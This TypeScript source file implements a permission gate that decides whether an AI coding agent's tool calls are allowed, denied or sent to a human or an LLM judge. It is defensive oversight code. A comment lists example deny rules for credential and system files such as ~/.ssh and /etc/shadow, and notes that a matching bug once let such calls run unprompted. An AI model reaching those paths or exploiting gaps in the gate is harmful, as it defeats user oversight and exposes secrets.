/**
 * PiPermissionEngine — pure, engine-neutral tool-gating decision for pi.
 *
 * pi has no native permission system (docs/protocol-pi/README.md
 * "Extensions"); PiSession.gateToolCall calls `decide()` on every `tool_call`
 * hook invocation with the session's live mode + the user's merged Claude
 * permission rules + a per-session "always allow" set, and turns the result
 * into an allow/deny/ask response for PiBridgeHost.
 *
 * Mirrors ADR-022's opencode ruleset semantics with an EVALUATOR instead of a
 * compiled ruleset (opencode patches a ruleset onto its own server; pi has no
 * server-side permission concept to patch, so ClaudeUI evaluates the same
 * rules itself, per tool_call, entirely in the main process).
 */
import path from 'node:path'
import { homedir } from 'node:os'
import type { ToolKind } from '../../shared/tool-kinds'
import { hostedMcpKind } from '../../shared/tool-kinds'
import {
  isSessionToolName,
  SESSION_TOOL_NAMES,
  SESSION_TOOLS_SERVER_NAME,
  type SessionToolName
} from '../../shared/session-tools-description'
import type { ClaudePermissions, PermissionScope } from '../../shared/types'
import { loadClaudePermissions } from '../services/claude-settings'
import { parseClaudeRule } from '../opencode/permission-compiler'
import { isAgentControlTarget } from '../automode/agent-control-paths'
import { allowCovers, denyAskHit, type DenyAskHit } from '../permissions/shell-rules'
import { readOnlyVerdict } from '../automode/read-only'
import { hostRealpath } from '../automode/read-only-gate'
import { logger } from '../services/logger'
import {
  humanOnlyMessage,
  pathFacts,
  piResolvePath,
  readBlockMessage,
  symlinkWriteMessage,
  type PiPathFacts,
  type PiPathScope
} from './pi-path-scope'

export type PermissionDecision = 'allow' | 'ask' | 'deny'

/**
 * WHICH rung of `decide()`'s ladder produced the verdict. Provenance, not a
 * second decision: `decide()` collapses this away and is unchanged.
 *
 * The load-bearing case is `'ask-rule'` — auto mode (phase 4 of
 * `docs/automode-rework-plan.md`) must send an ask the USER authored straight
 * to the human rather than letting the classifier auto-approve it (G9 / ref §3
 * step 1), and an `'ask'` decision alone cannot tell a user rule from the mode
 * base. pi is the engine that CAN answer this natively — opencode discards the
 * matched rule before publishing `permission.asked`, so its wiring has to
 * re-match host-side (`opencode/wildcard.ts`); here the evaluator IS ours, so
 * we simply report what it matched.
 */
export type PermissionDecisionSource =
  | 'deny-rule'
  | 'hosted-auto-allow'
  | 'ask-rule'
  | 'session-allow'
  | 'allow-rule'
  | 'mode-base'
  // The containment rung's own verdicts (H1): a leaf-symlink or read-block DENY, and the
  // HUMAN-ONLY asks (an unplaceable path, a Windows path trick, an edit a link carried out of
  // the workspace). Like `ask-rule`, an ask with this source goes to the human in every mode —
  // auto mode's judge never sees it.
  | 'path-scope'

/** Why the containment rung answered as it did (carried on the verdict for the callers' routing and wording). */
export type PathVerdictReason =
  'outside-scope' | 'unresolved' | 'human-only' | 'symlink' | 'read-block'

export interface PermissionVerdict {
  decision: PermissionDecision
  source: PermissionDecisionSource
  /** The user-authored Claude rule string that matched, for the rule-sourced verdicts. */
  rule?: string
  /** Set by the containment rung (a `ctx.scope` call on a path tool): why a path-sensitive verdict is what it is. */
  pathReason?: PathVerdictReason
  /** The model-facing deny text, or the card line of a human-only ask, for a `path-scope` verdict. */
  message?: string
  /**
   * With `pathReason: 'outside-scope'`: where the call really lands (the symbolic-link landing, else
   * the canonical path), for the card's "always allow" suggestion (a path-scoped rule): the
   * rule names the directory the call reaches, never the in-project link's spelling. Absent for an agent-control edit, which is
   * never offered a standing rule.
   */
  pathTarget?: string
  /**
   * An 'ask' on an edit/write that touches an agent-control path (inside the workspace or out):
   * the card offers NO "always allow" suggestion: the sensitive check runs before the allow tier,
   * so a saved allow could never silence this card; it would only widen what other calls may do.
   */
  pathSensitive?: true
}

/**
 * The merged (user + project + local scope) Claude permission rule set: ClaudePermissions plus
 * the provenance the containment rung needs and a plain three-scope merge loses.
 */
export interface MergedClaudeRules extends ClaudePermissions {
  /** The entries of `additionalDirectories` that did NOT come from project settings (the read block does not honour project-sourced ones). Absent = no provenance: all count. */
  nonProjectAdditionalDirectories?: string[]
}

export interface PermissionEngineContext {
  /**
   * The user's EFFECTIVE Claude-style permission mode, as arrives at
   * PiSession.setPermissionMode: 'default' | 'acceptEdits' | 'plan' | 'auto' | 'full' | ...
   * pi callers pass it as the user has it (a child's: narrowed) — NOT a downgraded stand-in:
   * the ladder picks its own base from `(mode, judge)` (see {@link ladderBase}), so no pi caller
   * can get `auto` -> allow-everything by accident.
   */
  mode: string
  /**
   * Is a judge (auto mode's LLM gatekeeper) in the loop for this call? Only meaningful for
   * `auto`/`full`, and ALWAYS passed by the pi callers (PiSession, its children, the pi dispatch
   * target): judged -> the `acceptEdits` base with the allow tier stripped (the judge decides
   * what the base asks); `false` (the user turned the judge off) -> the `default` base with the
   * caller's full rule set, because without a judge an `auto` mode must not widen anything beyond
   * what a human would have been asked. ABSENT is the legacy contract: everything passes through
   * as the raw mode's own base (`auto`/`full` -> allow-everything), no stripping.
   */
  judge?: boolean
  rules: MergedClaudeRules
  /**
   * "Allow for this session" entries. pi: {@link piSessionAllowKey} — `bash:<normalized
   * command>`, `<path tool>:<abs path>` (`read`, `edit`, `write`, `grep`, `find`, `ls`), else the bare tool name; set
   * `sessionAllowsByPath`. Without it the bare {@link sessionAllowKey} is used for everything but bash.
   */
  sessionAllows: ReadonlySet<string>
  /** `sessionAllows` holds pi's per-path keys for the path tools ({@link piSessionAllowKey}); absent = the bare-name keys. */
  sessionAllowsByPath?: boolean
  /**
   * The workspace the containment rung checks pi's path tools (`read`, `edit`, `write`, `grep`,
   * `find`, `ls`) against — see `pi-path-scope.ts`. ONLY the pi callers pass it (PiSession, its
   * children, the pi dispatch target, all with a `judge`): absent, the ladder has no notion of
   * "outside the workspace" and behaves exactly as before, which is what every scope-less
   * caller relies on. With it the ladder resolves each call's
   * path as pi will (`@x`, `~/x`, `file://`, …), matches path rules and session-allow keys on that
   * canonical path, and answers per the containment table (see {@link scopedBase}).
   * `bypassPermissions` ignores it (allow-everything is its contract).
   */
  scope?: PiPathScope
  /**
   * The session's working directory — lets `ruleMatchesTool` resolve a
   * path-bearing tool call's `path`/`file_path` argument (pi's own tool
   * schemas document it as "relative or absolute", model's choice —
   * verified against pi-mono's tools/{edit,write,read,grep,find,ls}.ts
   * `Type.Object` schemas) into the SAME canonical form opencode's real
   * server-side matcher compares against: the path relative to cwd
   * (vendor/opencode-src/packages/opencode/src/tool/read.ts —
   * `path.relative(instance.worktree, filepath)`, mirrored identically by
   * edit.ts/write.ts). See `resolveMatchPath`.
   *
   * Optional: `PiSession.gateToolCallInner` passes `this.cwd`, and so does
   * the cross-engine-dispatcher's `gatePiTargetToolCall` (its rules are the
   * user's deny/ask tiers only, ADR-085 §3, and the acceptEdits base's
   * agent-control-path check — ADR-084 §3, `editsAgentControlPath` — resolves
   * the path against it).
   * Any caller that omits it falls back to matching the RAW input path
   * (best-effort — see `resolveMatchPath`'s doc comment).
   *
   * In plan mode it also enables the second read-only oracle
   * ({@link isPlanReadOnlyCommand}); without it only pi's plan-safe list decides.
   */
  cwd?: string
  /** Path semantics for plan mode's second read-only oracle. Tests inject; sessions default to the host (`process.platform`). */
  platform?: NodeJS.Platform
  /** realpath for plan mode's second read-only oracle. Tests inject; sessions default to the host (`hostRealpath`). */
  realpath?: PlanReadOnlyScope['realpath']
  /**
   * How a Claude MCP rule's tool name is spelled in THIS engine's tool names
   * before it is compared (ADR-096). pi sanitizes `mcp__<server>__<tool>` to
   * `[A-Za-z0-9_]` (`mcp__my-server__x` is called `mcp__my_server__x`), so pi's
   * gates pass `piMcpRuleKey` and a rule written for Claude matches pi's call.
   * Absent = compared as written.
   */
  mcpRuleKey?: (ruleTool: string) => string
}

// ---------------------------------------------------------------------------
// piToolKind — SAME mapping as the renderer's PiEngineToolMap.kindOf
// ---------------------------------------------------------------------------

/**
 * Mirrors `PiEngineToolMap.kindOf` (src/renderer/.../PiEngineToolMap.ts) for
 * this engine's mode-base decisions. Main cannot import renderer code (they
 * are separate Electron processes/bundles), so this switch is intentionally
 * DUPLICATED here rather than shared — PiEngineToolMap.test.ts asserts the two
 * tables agree for every known pi tool name (single-source guard): a change to
 * one without the other fails that test.
 */
export function piToolKind(toolName: string): ToolKind {
  const mcpKind = hostedMcpKind(toolName)
  if (mcpKind !== null) return mcpKind

  switch (toolName) {
    case 'bash':
      return 'command'
    case 'edit':
      return 'fileEdit'
    case 'write':
      return 'fileWrite'
    case 'read':
      return 'fileRead'
    case 'grep':
    case 'find':
    case 'ls':
      return 'search'
    // Plan mode (M5a): the bridge extension's locally-executed exit_plan
    // tool (pi-bridge-source.ts, gated on CLAUDEUI_PI_PLAN_TOOLS) — reuses
    // the SAME 'plan' kind Claude's ExitPlanMode maps to (tool-kinds.ts),
    // so it gets its own mode-base treatment (planModeBaseDecision below)
    // and renders ExitPlanModeCard on the renderer side. Mirrors
    // PiEngineToolMap.kindOf's IDENTICAL case — the single-source guard
    // test (PiEngineToolMap.test.ts) asserts the two tables agree.
    case 'exit_plan':
      return 'plan'
    // Hosted tools (M4a+b) registered via pi.registerTool() in the bridge
    // extension use BARE names — hostedMcpKind above only matches `mcp__*`
    // prefixed names, so these need explicit cases here too. Mirrors
    // PiEngineToolMap.kindOf's IDENTICAL cases (renderer side) — the
    // single-source guard test (PiEngineToolMap.test.ts) asserts the two
    // tables agree for every known pi tool name.
    case 'render_mermaid':
      return 'diagram'
    case 'create_mockup':
    case 'show_mockup':
      return 'mockup'
    case 'dispatch_agent':
      return 'task'
    // Host-run pi subagents (ADR-089): the bridge's own `agent` tool
    // (pi-bridge-source.ts v9, gated on CLAUDEUI_PI_AGENT_TOOL) — the SAME
    // 'task' kind dispatch_agent uses (TaskCard is engine-neutral). Mirrors
    // PiEngineToolMap.kindOf's IDENTICAL case (single-source guard test).
    case 'agent':
      return 'task'
    // `subagent`: legacy M5b transcripts (the retired in-pi extension) and
    // pi's upstream example subagent extension a user may load themselves.
    // Same 'task' kind; mirrored in PiEngineToolMap.kindOf.
    case 'subagent':
      return 'task'
    // ADR-089 S3b: the bridge's `send_message` / `task_stop` — Claude's
    // SendMessage / TaskStop row kinds. Mirrored in PiEngineToolMap.kindOf.
    case 'send_message':
      return 'detail'
    case 'task_stop':
      return 'note'
    // The bridge's `list_models` (read-only; a one-line note row).
    case 'list_models':
      return 'note'
    default:
      // The session tools (bridge v15) are bare-named hosted tools too; the generic
      // MCP kind, as Claude's `mcp__claude-ui-sessions__*` take. Mirrored in
      // PiEngineToolMap.kindOf. Their gate is `sessionToolsGate`, not this ladder.
      return isSessionToolName(toolName) ? 'mcp' : 'unknown'
  }
}

// ---------------------------------------------------------------------------
// Hosted-tool auto-allow (M4a)
// ---------------------------------------------------------------------------

/**
 * Hosted LLM tools (M4a) — ClaudeUI's own render_mermaid/create_mockup/
 * show_mockup, registered via pi.registerTool() over the bridge (see
 * pi-bridge-source.ts + PiBridgeHost's /hosted-tool route). ALWAYS ALLOWED —
 * parity with Claude's auto-allowed `mcp__claude-ui__` prefix and opencode's
 * silent `{*:allow}` baseline for the same tools. Checked in decide() AFTER
 * deny rules (a user's explicit deny still wins — see decide()'s doc
 * comment) but BEFORE ask/sessionAllows/allow/mode-base, so these three
 * never prompt or fall through the ladder. `list_models` (ADR-089: the models
 * an `agent` call may name) rides the same rung: read-only, so never a card.
 *
 * `dispatch_agent` is deliberately NOT in this set: it gets NORMAL gating
 * (falls through to mode base), matching Claude routing dispatch_agent
 * through its own separate, non-auto-allowed `claude-ui-collab` MCP server
 * (collab-tool.ts) rather than the auto-allowed `claude-ui` one.
 */
export const PI_AUTO_ALLOW_HOSTED_TOOLS: ReadonlySet<string> = new Set([
  'render_mermaid',
  'create_mockup',
  'show_mockup',
  // Read-only: lists the models an `agent` call may name (a deny rule still wins).
  'list_models'
])

/**
 * EVERY tool registered via `pi.registerTool()` in the bridge extension that
 * executes over `/hosted-tool` (M4a+b, plus ADR-088's `agent`) —
 * PI_AUTO_ALLOW_HOSTED_TOOLS above is a STRICT SUBSET (the three auto-allowed
 * ones; `dispatch_agent` and `agent` get normal gating instead, see
 * PI_AUTO_ALLOW_HOSTED_TOOLS' doc comment for why — `agent`'s gate is
 * PiSession's spawn-call rung, ADR-089 Q1). PiSession's
 * gateToolCall wrapper checks THIS superset — not the auto-allow set — to
 * decide which allow decisions mint a one-shot `/hosted-tool` execution grant
 * (security fix: a call outside this set has no `/hosted-tool` counterpart to
 * ever execute, so no grant is needed or minted for it).
 */
export const PI_HOSTED_TOOL_NAMES: ReadonlySet<string> = new Set([
  'render_mermaid',
  'create_mockup',
  'show_mockup',
  'dispatch_agent',
  'agent',
  'send_message',
  'task_stop',
  'list_models',
  // The session tools (bridge v15): their gate is PiSession's `sessionToolsGate` rung,
  // and the allow it gives mints the one-shot grant like any other hosted tool.
  ...SESSION_TOOL_NAMES
])

// ---------------------------------------------------------------------------
// Claude rule string -> pi kind mapping (for evaluating the user's rules)
// ---------------------------------------------------------------------------

/**
 * Claude canonical tool name -> the pi ToolKinds its rules govern, for matching the user's
 * Tool(specifier) rule strings against a pi tool_call. LS is included
 * alongside Grep/Glob (all three collapse to pi's single 'search' kind,
 * pi's `ls`/`grep`/`find` tools) for parity with opencode's own
 * TOOL_TO_CATEGORY table (permission-compiler.ts), which treats Read/Glob/
 * Grep/LS as siblings. Any Claude tool name NOT in this table (WebFetch,
 * NotebookEdit, MultiEdit, ...) has no pi analog and never matches. `Agent`/
 * `Task` are not in it either: they name ONE pi tool, not a kind (`AGENT_RULE_TOOLS`).
 *
 * Claude Code's own semantics for the two path families: an `Edit(...)` rule governs every file
 * change (pi's `edit` AND `write`: a deny on a path is not sidestepped by writing the whole
 * file), and a `Read(...)` rule governs every read of the file system (pi's `read` AND the
 * path of `grep`/`find`/`ls`). `Write`, `Grep`, `Glob` and `LS` stay on their own kinds. (opencode
 * folds `Write` into `edit` as well, and keeps its search tools apart from `read`:
 * `opencode/permission-keys.ts`; those engines' rules compile on their own, nothing is shared.)
 */
const CLAUDE_TOOL_TO_KINDS: Record<string, readonly ToolKind[]> = {
  Bash: ['command'],
  Edit: ['fileEdit', 'fileWrite'],
  Write: ['fileWrite'],
  Read: ['fileRead', 'search'],
  Grep: ['search'],
  Glob: ['search'],
  LS: ['search']
}

/** Claude's names for the sub-agent launcher; a rule on either matches pi's `agent` tool only (H5). */
const AGENT_RULE_TOOLS: ReadonlySet<string> = new Set(['Agent', 'Task'])
/** pi's host-run subagent launcher (the bridge's `agent` tool, ADR-089). */
const PI_AGENT_TOOL = 'agent'
const DEFAULT_AGENT_TYPE = 'general-purpose'

/** The agent type an `agent` call names — `general-purpose` when omitted, as the launcher resolves it. */
function agentTypeOf(input: Record<string, unknown>): string {
  const type = input.subagent_type
  return typeof type === 'string' && type.trim() !== '' ? type.trim() : DEFAULT_AGENT_TYPE
}

/** `Agent(Explore*)`-style specifier -> an anchored, case-sensitive matcher (`*` any run, `?` one char). */
function agentTypeGlob(specifier: string): RegExp {
  const body = specifier
    .replace(/[.+^${}()|[\]\\]/g, '\\$&')
    .replace(/\*/g, '.*')
    .replace(/\?/g, '.')
  return new RegExp(`^${body}$`, 's')
}

/** Reverse of the above, for building "always allow" suggestions from a pi tool_call (PiSession). */
export const PI_TOOL_TO_CLAUDE_TOOL: Record<string, string> = {
  bash: 'Bash',
  edit: 'Edit',
  write: 'Write',
  read: 'Read',
  grep: 'Grep',
  find: 'Glob',
  ls: 'LS'
}

/** Trim + collapse internal whitespace runs, for comparing bash commands. */
export function normalizeWhitespace(s: string): string {
  return s.trim().replace(/\s+/g, ' ')
}

function commandOf(input: Record<string, unknown>): string {
  return String(input.command ?? '')
}

// ---------------------------------------------------------------------------
// Path-glob specifier matching (path-bearing Claude rules: Edit(src/**),
// Read(docs/**), Write(...), and Grep/Glob/LS path scoping)
// ---------------------------------------------------------------------------

/**
 * Claude/opencode-compatible glob matcher — a faithful PORT of opencode's own
 * `Wildcard.match` (vendor/opencode-src/packages/core/src/util/wildcard.ts).
 * That function is what opencode's REAL server uses to compare a tool's
 * concrete path against a compiled rule's `pattern` — NOT
 * `../opencode/permission-compiler.ts` (checked first): that module only
 * rewrites Claude `Tool(specifier)` rule STRINGS into opencode's
 * `{permission,pattern,action}` shape, passing specifiers through verbatim
 * (see its `translateSpecifier` — file globs "pass through"). The actual
 * glob MATCHING happens inside the spawned `opencode serve` binary and is
 * never imported into ClaudeUI's own bundle, so there is nothing to
 * literally import here — porting this algorithm (rather than inventing a
 * different one) is what gives pi and opencode IDENTICAL results for the
 * same rule string, which is the whole point of this fix.
 *
 * Semantics (read from the vendored source, not guessed):
 *  - `*` -> `.*` — matches ANY run of characters, INCLUDING `/`. There is no
 *    special "single path segment" `*` vs "any depth" `**` distinction the
 *    way shell/minimatch globs have one — `**` degrades to two consecutive
 *    `.*` (still just "match anything"), so `src/**` and `src/*` behave
 *    identically under this matcher.
 *  - `?` -> `.` (single char).
 *  - Both the concrete input and the rule pattern are backslash-normalized
 *    (`\` -> `/`) before comparing, so a Windows-style input path matches a
 *    `/`-separated rule glob.
 *  - Case sensitivity is PLATFORM-DEPENDENT: case-insensitive (regex `i`
 *    flag) only when `process.platform === 'win32'`, case-sensitive
 *    everywhere else — ported verbatim (not simplified), so pi on Windows
 *    (this dev platform) matches opencode on Windows exactly.
 *  - `s` (dotAll) is always set, so `.` (from escaping literal chars) and
 *    `.*` also match embedded newlines.
 */
export function claudeGlobMatches(input: string, pattern: string): boolean {
  const normalized = input.replaceAll('\\', '/')
  let escaped = pattern
    .replaceAll('\\', '/')
    .replace(/[.+^${}()|[\]\\]/g, '\\$&')
    .replace(/\*/g, '.*')
    .replace(/\?/g, '.')
  // Ported verbatim from Wildcard.match, including this narrow trailing-
  // " *"-pattern carve-out (opencode uses it for its own task/subagent-type
  // matching; a no-op for ordinary path globs, kept for byte-for-byte
  // fidelity with the source we're mirroring).
  if (escaped.endsWith(' .*')) escaped = escaped.slice(0, -3) + '( .*)?'
  return new RegExp('^' + escaped + '$', process.platform === 'win32' ? 'si' : 's').test(normalized)
}

/** Path-bearing pi kinds — the only ones a path-glob specifier can meaningfully match against. */
const PATH_BEARING_KINDS: ReadonlySet<ToolKind> = new Set<ToolKind>([
  'fileEdit',
  'fileWrite',
  'fileRead',
  'search'
])

/**
 * Extract the path argument pi's tool_call input carries for a path-bearing
 * kind. `edit`/`write`/`read` carry `path` (pi-mono's tools/{edit,write,
 * read}.ts `Type.Object` schemas, confirmed against the published source —
 * `edit.ts` additionally accepts a legacy `file_path` alias at its OWN
 * argument-prep step; it's unspecified whether that normalization has
 * already run by the time the `tool_call` hook fires, so this checks BOTH
 * defensively). `grep`/`find`/`ls` carry `path` too (the search ROOT
 * directory, optional — defaults to cwd when omitted; confirmed against
 * pi-mono's tools/{grep,find,ls}.ts schemas).
 */
function extractToolPath(input: Record<string, unknown>): string | undefined {
  const path = input.path
  if (typeof path === 'string' && path.length > 0) return path
  const filePath = input.file_path
  if (typeof filePath === 'string' && filePath.length > 0) return filePath
  return undefined
}

/**
 * Resolve a tool's raw path argument to the SINGLE canonical form matched
 * against a rule's glob specifier — mirrors opencode's real behavior exactly
 * (vendor/opencode-src's read.ts/edit.ts/write.ts: resolve to absolute
 * against the working directory if relative, then `path.relative(worktree,
 * absolute)`) rather than trying the raw AND cwd-relative forms and OR-ing
 * them together: an OR would let an ALLOW rule over-match (e.g. an absolute
 * path that happens to textually contain `src/**`'s literal characters
 * matching a glob it was never meant to cover) — the worst possible
 * direction for a permission gate to be wrong in.
 *
 * An absolute path OUTSIDE `cwd` relativizes to a `../`-prefixed string,
 * which correctly fails a plain relative glob like `src/**` — this is the
 * additionalDirectories/external-directory case; see the
 * containment rung (`ctx.scope`), which holds the additional directories as roots.
 *
 * `cwd` absent falls back to matching the RAW path as-is (backslash-
 * normalized only), best-effort — documented, not silently pretended to be
 * correct. Every real caller threads `cwd` (`PiSession.gateToolCallInner`,
 * the dispatcher's `gatePiTargetToolCall`).
 *
 * Path FLAVOR (win32 vs posix semantics) follows `cwd`'s own syntax — NOT
 * the host platform running this process. A session's `cwd` is a string
 * captured from wherever pi is actually running (could be a Windows path
 * even when ClaudeUI's main process itself runs on macOS/Linux, e.g. in a
 * test or a remote/WSL-adjacent setup); using `node:path`'s host-default
 * `isAbsolute`/`resolve`/`relative` would treat a Windows absolute path
 * (`D:\repo`, `\\server\share`) as a RELATIVE posix path on a non-Windows
 * host, silently breaking containment. `looksWindowsAbsolute` recognizes a
 * drive-letter (`D:\` / `D:/`) or UNC (`\\server\share`) prefix; everything
 * else uses posix semantics (a plain `/repo`-style cwd, or a bare relative
 * cwd, which posix treats the same way any reasonable default would).
 */
function looksWindowsAbsolute(p: string): boolean {
  return /^[a-zA-Z]:[\\/]/.test(p) || p.startsWith('\\\\')
}

/** win32 vs posix path semantics, keyed on `cwd`'s own syntax — see `resolveMatchPath`'s doc comment for why NOT the host platform. */
function pathFlavor(cwd: string): typeof path.win32 {
  return looksWindowsAbsolute(cwd) ? path.win32 : path.posix
}

/** The tool's raw path argument resolved against `cwd` (flavor-aware), still in the flavor's native separator form. */
function toAbsolutePath(rawPath: string, cwd: string): string {
  const flavor = pathFlavor(cwd)
  const normalizedRaw = flavor === path.win32 ? rawPath : rawPath.replaceAll('\\', '/')
  // `normalize` rather than `resolve` for the already-absolute case: identical
  // result, minus any chance of consulting the HOST process's cwd.
  return flavor.isAbsolute(normalizedRaw)
    ? flavor.normalize(normalizedRaw)
    : flavor.resolve(cwd, normalizedRaw)
}

function resolveMatchPath(rawPath: string, cwd: string | undefined): string {
  if (!cwd) return rawPath.replaceAll('\\', '/')
  return pathFlavor(cwd).relative(cwd, toAbsolutePath(rawPath, cwd)).replaceAll('\\', '/')
}

// ---------------------------------------------------------------------------
// Absolute / home-dir rule specifiers
// ---------------------------------------------------------------------------

/**
 * Canonical form for an ABSOLUTE path or glob — forward slashes plus an
 * upper-cased drive letter. Both sides of an absolute comparison go through
 * this, so `d:\secrets\x` and `D:/secrets/x` compare equal even on a
 * case-SENSITIVE host (claudeGlobMatches only sets the regex `i` flag when
 * `process.platform === 'win32'`, mirroring opencode; a Windows-flavored cwd
 * on a posix host is a real configuration — see `resolveMatchPath`). Only the
 * drive letter is case-folded: the rest of the path keeps the platform-keyed
 * sensitivity the relative branch has always had.
 */
function normalizeAbsolute(p: string): string {
  const slashed = p.replaceAll('\\', '/')
  return /^[a-z]:/.test(slashed) ? slashed[0].toUpperCase() + slashed.slice(1) : slashed
}

/**
 * Claude Code's Windows absolute rule `//c/rest` (cli.js writes `C:/x` that way
 * and reads it back as drive `C:` + `/rest`); `//c` is the drive root. cli.js
 * does not recognise `//C:/rest`, but accepting it only ever tightens a deny.
 * Only a single-letter first segment is a drive. Null for anything else.
 */
function windowsDriveRule(specifier: string): string | null {
  const match = /^\/\/([A-Za-z]):?(?:[\\/](.*))?$/.exec(specifier)
  return match ? `${match[1].toUpperCase()}:/${match[2] ?? ''}` : null
}

/**
 * RULE-side normalisation: does this specifier denote an ABSOLUTE location,
 * and if so what glob does it become? Returns null for an ordinary
 * cwd-relative glob (`src/**`), whose semantics are deliberately untouched.
 *
 * `resolveMatchPath` always relativises the TOOL path against cwd, but rule
 * specifiers were matched verbatim — so every absolute-looking specifier was
 * compared against a relative string and could NEVER match. `Edit(~/.ssh/**)`,
 * `Read(//etc/shadow)` and `Edit(D:\secrets\**)` were inert: the tool ran with
 * no prompt at all, in every mode, silently. Recognised forms:
 *
 *  - `//abs/path/**` — Claude rule syntax marks an absolute path with a
 *    DOUBLED leading slash (a single `/` means "relative to the settings file"
 *    and is left alone here). Strip one slash. On a Windows session (`windows`)
 *    `//c/rest` (and `//C:/rest`) is the drive form `C:/rest`.
 *  - `~` / `~/…` — the user's home directory.
 *  - `X:\…` / `X:/…` / `\\server\share\…` — Windows absolute + UNC.
 *
 * A UNC path written with forward slashes (`//server/share/**`) is read as the
 * Claude `//`-absolute form (→ `/server/share/**`); spell UNC rules with
 * backslashes, as Windows itself does, to get UNC semantics.
 */
function absoluteSpecifierGlob(specifier: string, windows: boolean): string | null {
  if (specifier.startsWith('//')) {
    return normalizeAbsolute((windows ? windowsDriveRule(specifier) : null) ?? specifier.slice(1))
  }
  if (specifier === '~') return normalizeAbsolute(homedir())
  if (specifier.startsWith('~/') || specifier.startsWith('~\\')) {
    return normalizeAbsolute(`${homedir().replace(/[\\/]+$/, '')}/${specifier.slice(2)}`)
  }
  if (looksWindowsAbsolute(specifier)) return normalizeAbsolute(specifier)
  return null
}

/**
 * The tool path in the canonical ABSOLUTE form an `absoluteSpecifierGlob`
 * result is compared against. Without a `cwd` we cannot resolve a relative
 * input, so we fall back to the raw path — the same documented best-effort
 * `resolveMatchPath` uses (an absolute input still matches correctly there).
 */
function resolveAbsoluteMatchPath(rawPath: string, cwd: string | undefined): string {
  return normalizeAbsolute(cwd ? toAbsolutePath(rawPath, cwd) : rawPath)
}

const MCP_RULE_PREFIX = 'mcp__'

/**
 * Claude's MCP rule vocabulary, the one tier of the ladder whose rules are not
 * `Tool(specifier)` at all: `mcp__<server>` names every tool on one server and
 * `mcp__<server>__<tool>` names one tool, and neither takes a specifier.
 * `mcp__<server>__*` is the server form too (cli.js reads a `*` tool name as
 * "every tool on the server"), so a trailing `__*` is dropped first. The
 * rule string IS the tool name the engine is asked about, so these are matched
 * against the NAME rather than through {@link CLAUDE_TOOL_TO_KINDS} (which lists
 * only the seven tools with a pi analogue, and so made every `mcp__…` rule a
 * user wrote inert in every tier).
 *
 * pi's own `mcp__*` tool calls honour the same rules under these names, which
 * they never did before.
 */
function mcpRuleMatches(
  parsed: { tool: string; specifier?: string },
  toolName: string,
  ruleKey: ((ruleTool: string) => string) | undefined
): boolean {
  // `Tool()` / `Tool(*)` already collapsed to a bare rule in parseClaudeRule; a
  // rule that still carries a specifier is asking for something Claude's MCP
  // syntax cannot express, and inventing a meaning for it here would either
  // over- or under-grant. It matches nothing, exactly as it did before.
  if (parsed.specifier !== undefined) return false
  const bare = parsed.tool.endsWith('__*') ? parsed.tool.slice(0, -3) : parsed.tool
  // The engine's spelling of the rule (pi: its sanitizer), applied AFTER the
  // server-form `__*` is dropped so the wildcard is never sanitized into a name.
  const rule = ruleKey ? ruleKey(bare) : bare
  return toolName === rule || toolName.startsWith(`${rule}__`)
}

/**
 * Does a single Claude rule string match this pi tool_call? Bare tool rules
 * (no specifier) match unconditionally for the mapped kind. The COMMAND kind
 * never comes through here: `decideWithSource` matches every Bash tier as a
 * whole with ADR-085's matcher (`../permissions/shell-rules`), so there is one
 * Bash path per tier. Path-bearing
 * specifiers (Edit/Write/Read/Grep/Glob/LS) are evaluated as path globs
 * against the tool call's path argument — cwd-relative for an ordinary glob
 * (`resolveMatchPath`), absolute for an absolute/home/Windows-absolute
 * specifier (`absoluteSpecifierGlob` + `resolveAbsoluteMatchPath`), both via
 * `claudeGlobMatches` — this also covers Grep/Glob "search pattern"
 * specifiers like `Grep(TODO)`: they're attempted as a path glob against the
 * search-root `path` field, which a bare search-TERM string essentially
 * never coincidentally matches as a directory glob, so they fall through to
 * the mode base exactly as before (never default-allow) — WITHOUT a
 * separate logged "skip" path, since this is now a real (if usually
 * non-matching) evaluation rather than a silent gap.
 */
function ruleMatchesTool(
  rule: string,
  kind: ToolKind,
  toolName: string,
  input: Record<string, unknown>,
  cwd: string | undefined,
  mcpRuleKey?: (ruleTool: string) => string
): boolean {
  const parsed = parseClaudeRule(rule)
  if (!parsed) return false
  if (parsed.tool.startsWith(MCP_RULE_PREFIX)) return mcpRuleMatches(parsed, toolName, mcpRuleKey)
  // `Agent` / `Task` (Claude's two spellings of the sub-agent launcher): pi's own `agent` tool
  // and nothing else — not `dispatch_agent` (a different, cross-engine tool) and not a legacy
  // `subagent` call, though all of them share the `task` kind. The specifier is Claude's agent
  // type, matched as a glob against the call's `subagent_type` (default `general-purpose`).
  if (AGENT_RULE_TOOLS.has(parsed.tool)) {
    if (toolName !== PI_AGENT_TOOL) return false
    if (parsed.specifier === undefined) return true
    return agentTypeGlob(parsed.specifier).test(agentTypeOf(input))
  }
  if (!CLAUDE_TOOL_TO_KINDS[parsed.tool]?.includes(kind)) return false

  const specifier = parsed.specifier
  if (specifier === undefined) return true

  if (PATH_BEARING_KINDS.has(kind)) {
    const rawPath = extractToolPath(input)
    // No usable path on the input -> the rule cannot match. Never
    // default-allow on a missing path (hard rule).
    if (rawPath === undefined) return false
    // An absolute/home/Windows-absolute specifier is matched against the
    // ABSOLUTE tool path; everything else keeps the cwd-relative semantics
    // (which is what opencode's real server-side matcher compares against).
    // `//c/x` is a drive on a Windows session (cwd's own syntax, as in
    // `pathFlavor`; the host platform only when there is no cwd).
    const absoluteGlob = absoluteSpecifierGlob(
      specifier,
      cwd ? looksWindowsAbsolute(cwd) : process.platform === 'win32'
    )
    // A search's `path` is a directory whose contents are read: `Read(//x/**)` must hold for a
    // `grep`/`ls` of `/x` itself, which the glob (it wants a `/x/` prefix) would otherwise miss.
    const asSearchRoot = (p: string): string[] =>
      kind === 'search' && p !== '' && !p.endsWith('/') ? [p, `${p}/`] : [p]
    if (absoluteGlob !== null) {
      return asSearchRoot(resolveAbsoluteMatchPath(rawPath, cwd)).some((p) =>
        claudeGlobMatches(p, absoluteGlob)
      )
    }
    return asSearchRoot(resolveMatchPath(rawPath, cwd)).some((p) => claudeGlobMatches(p, specifier))
  }

  // No other pi kind carries a specifier-matchable argument (plan/task/
  // diagram/mockup/mcp/unknown) — never matches.
  return false
}

/** The "allow for this session" dedup key for a tool_call — bash is scoped by its (normalized) command, everything else by bare tool name. The bare keys; pi uses {@link piSessionAllowKey}. */
export function sessionAllowKey(toolName: string, input: Record<string, unknown>): string {
  if (toolName === 'bash') return `bash:${normalizeWhitespace(String(input.command ?? ''))}`
  return toolName
}

